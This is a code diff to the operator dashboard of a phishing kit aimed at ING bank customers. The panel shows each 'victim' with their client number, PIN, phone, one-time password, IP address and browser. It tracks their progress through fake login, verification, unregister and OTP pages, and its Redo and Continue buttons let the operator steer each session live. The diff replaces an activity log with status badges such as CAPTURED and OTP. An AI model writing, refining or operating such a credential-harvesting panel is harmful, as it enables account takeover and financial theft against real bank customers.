@@ -127,57 +127,28 @@
       to { opacity: 0; transform: translateX(20px); }
     }
 
-    /* Activity Log Styles */
-    .activity-log {
-      margin-top: 20px;
-      border-top: 1px solid rgba(255,255,255,0.1);
-      padding-top: 16px;
+    /* Status Badge Styles */
+    .status-badge {
+      display: inline-flex;
+      flex-direction: column;
+      gap: 2px;
     }
-    .activity-title {
-      font-size: 12px;
-      font-weight: 600;
-      text-transform: uppercase;
-      letter-spacing: 0.1em;
-      color: var(--text-muted);
-      margin-bottom: 12px;
-    }
-    .activity-item {
-      display: flex;
-      align-items: flex-start;
-      gap: 12px;
-      padding: 10px 0;
-      border-bottom: 1px solid rgba(255,255,255,0.05);
-      font-size: 13px;
-    }
-    .activity-item:last-child { border-bottom: none; }
-    .activity-dot {
-      width: 8px;
-      height: 8px;
-      border-radius: 50%;
-      margin-top: 5px;
-      flex-shrink: 0;
-    }
-    .dot-connected { background: var(--blue); }
-    .dot-credentials { background: var(--green); }
-    .dot-phone { background: var(--blue); }
-    .dot-unregister { background: var(--yellow); }
-    .dot-otp { background: var(--green); }
-    .dot-page { background: var(--text-muted); }
-    .activity-content { flex: 1; }
-    .activity-action {
-      font-weight: 500;
-      color: var(--text-primary);
-      margin-bottom: 2px;
-    }
-    .activity-detail {
-      color: var(--text-muted);
-      font-size: 12px;
-    }
-    .activity-time {
-      color: var(--text-muted);
+    .status-page {
       font-size: 11px;
-      white-space: nowrap;
+      font-weight: 600;
+      letter-spacing: 0.05em;
+      color: var(--text-primary);
     }
+    .status-action {
+      font-size: 10px;
+      font-weight: 500;
+      text-transform: uppercase;
+      letter-spacing: 0.08em;
+    }
+    .status-connected { color: var(--blue); }
+    .status-captured { color: var(--green); }
+    .status-waiting { color: var(--yellow); }
+    .status-otp { color: var(--red); }
   </style>
 </head>
 <body>
@@ -197,7 +168,7 @@
         Active Sessions · <a id="domainLink" href="#" target="_blank" style="color:#007bff;text-decoration:none;"></a>
       </div>
       <table id="tbl"><thead><tr>
-        <th>#</th><th>Client</th><th>PIN</th><th>Phone</th><th>OTP</th><th>IP</th><th>Platform</th><th>Browser</th><th>Page</th><th></th>
+        <th>#</th><th>Client</th><th>PIN</th><th>Phone</th><th>OTP</th><th>IP</th><th>Platform</th><th>Browser</th><th>Status</th><th></th>
       </tr></thead><tbody></tbody></table>
       <div id="empty">No active sessions</div>
     </div>
@@ -209,10 +180,6 @@
         <h3 style="margin:0">Session Detail</h3><button onclick="closeModal()" class="btn">✕</button>
       </div>
       <div id="modalBody" style="font-size:13px;line-height:1.6"></div>
-      <div id="activitySection" class="activity-log" style="display:none;">
-        <div class="activity-title">Activity Log</div>
-        <div id="activityList"></div>
-      </div>
       <div style="margin-top:1.25rem;display:flex;gap:8px">
         <button id="redoBtn"  class="btn" onclick="act('redo',  currentSid)">🔁 Redo</button>
         <button id="contBtn"  class="btn" onclick="act('cont',  currentSid)">✅ Continue</button>
@@ -245,16 +212,38 @@
       }
     }
 
-    function getActionClass(action) {
-      const map = {
-        'CONNECTED': 'dot-connected',
-        'ENTERED CREDENTIALS': 'dot-credentials',
-        'ENTERED PHONE': 'dot-phone',
-        'CLICKED UNREGISTER': 'dot-unregister',
-        'ENTERED OTP': 'dot-otp',
-        'PAGE CHANGE': 'dot-page'
-      };
-      return map[action] || 'dot-page';
+    function getStatusDisplay(s) {
+      const page = pageTitle(s.page);
+      let statusText = '';
+      let statusClass = '';
+      
+      if (s.page === 'success') {
+        statusText = 'APPROVED';
+        statusClass = 'status-captured';
+      } else if (!s.entered && !s.phone && !s.unregisterClicked && !s.otp) {
+        statusText = 'CONNECTED';
+        statusClass = 'status-connected';
+      } else if (s.entered && !s.phone) {
+        statusText = 'CAPTURED';
+        statusClass = 'status-captured';
+      } else if (s.phone && !s.unregisterClicked) {
+        statusText = 'PHONE';
+        statusClass = 'status-waiting';
+      } else if (s.unregisterClicked && !s.otp) {
+        statusText = 'UNREGISTERED';
+        statusClass = 'status-waiting';
+      } else if (s.otp) {
+        statusText = 'OTP';
+        statusClass = 'status-otp';
+      } else {
+        statusText = 'WAITING';
+        statusClass = 'status-waiting';
+      }
+      
+      return `<div class="status-badge">
+        <span class="status-page">${page}</span>
+        <span class="status-action ${statusClass}">• ${statusText}</span>
+      </div>`;
     }
 
     /* ----------  ALERT SYSTEM  ---------- */
@@ -289,24 +278,6 @@
       
       container.appendChild(alert);
       setTimeout(() => alert.remove(), 5000);
-    }
-
-    /* ----------  SESSION HEADER  ---------- */
-    function getSessionHeader(v) {
-      if (v.page === 'success') return `🦁 ING Login approved`;
-      if (v.status === 'approved') return `🦁 ING Login approved`;
-      if (v.unregisterClicked) return `✅ Victim clicked unregister`;
-      if (v.page === 'index.html') {
-        return v.entered ? `✅ Received client + PIN` : '⏳ Awaiting client + PIN';
-      } else if (v.page === 'verify.html') {
-        return v.phone ? `✅ Received phone` : `⏳ Awaiting phone`;
-      } else if (v.page === 'unregister.html') {
-        return v.unregisterClicked ? `✅ Victim clicked unregister` : `⏳ Awaiting unregister`;
-      } else if (v.page === 'otp.html') {
-        if (v.otp && v.otp.length > 0) return `✅ Received OTP`;
-        return `🔑 Awaiting OTP...`;
-      }
-      return `🔑 Awaiting OTP...`;
     }
 
     /* ----------  CHECK FOR CHANGES & ALERT  ---------- */
@@ -345,29 +316,6 @@
       lastSessions = new Map(newSessions.map(s => [s.sid, {...s}]));
     }
 
-    function renderActivityLog(activityLog) {
-      const container = qs('#activityList');
-      if (!activityLog || activityLog.length === 0) {
-        qs('#activitySection').style.display = 'none';
-        return;
-      }
-      
-      qs('#activitySection').style.display = 'block';
-      container.innerHTML = activityLog.slice().reverse().map(item => {
-        const time = new Date(item.time).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' });
-        return `
-          <div class="activity-item">
-            <div class="activity-dot ${getActionClass(item.action)}"></div>
-            <div class="activity-content">
-              <div class="activity-action">${item.action}</div>
-              <div class="activity-detail">${item.detail}</div>
-            </div>
-            <div class="activity-time">${time}</div>
-          </div>
-        `;
-      }).join('');
-    }
-
     function render(d){
       qs('#active').textContent   = d.active;
       qs('#total').textContent    = d.totalVictims;
@@ -391,7 +339,7 @@
           <td>${s.ip}</td>
           <td>${s.platform}</td>
           <td>${s.browser}</td>
-          <td>${pageTitle(s.page)}</td>
+          <td>${getStatusDisplay(s)}</td>
           <td><button class="btn" onclick="showDetail('${s.sid}')">Manage</button></td>
         </tr>`).join('');
     }
@@ -412,11 +360,9 @@
         <div class="detail">IP</div><div>${s.ip}</div>
         <div class="detail">Platform</div><div>${s.platform}</div>
         <div class="detail">Browser</div><div>${s.browser}</div>
-        <div class="detail">Page</div><div>${pageTitle(s.page)}</div>
+        <div class="detail">Current Page</div><div>${pageTitle(s.page)}</div>
         <div class="detail">User-Agent</div><div style="word-break:break-all">${s.ua}</div>
         <div class="detail">Date</div><div>${localDate}</div>`;
-
-      renderActivityLog(s.activityLog);
 
       qs('#redoBtn').style.display  = (s.page==='success' || (s.page==='unregister.html' && s.unregisterClicked)) ? 'none':'inline-block';
       qs('#contBtn').style.display  =  s.page==='success' ? 'none':'inline-block';
@@ -434,12 +380,6 @@
       jsonData = await fetch('/api/panel').then(r=>r.json());
       checkChanges(jsonData.sessions);
       render(jsonData);
-      
-      // Refresh modal if open
-      if (currentSid && qs('#modal').style.display === 'flex') {
-        const s = jsonData.sessions.find(x => x.sid === currentSid);
-        if (s) renderActivityLog(s.activityLog);
-      }
     }
     load(); setInterval(load,2000);
   </script>
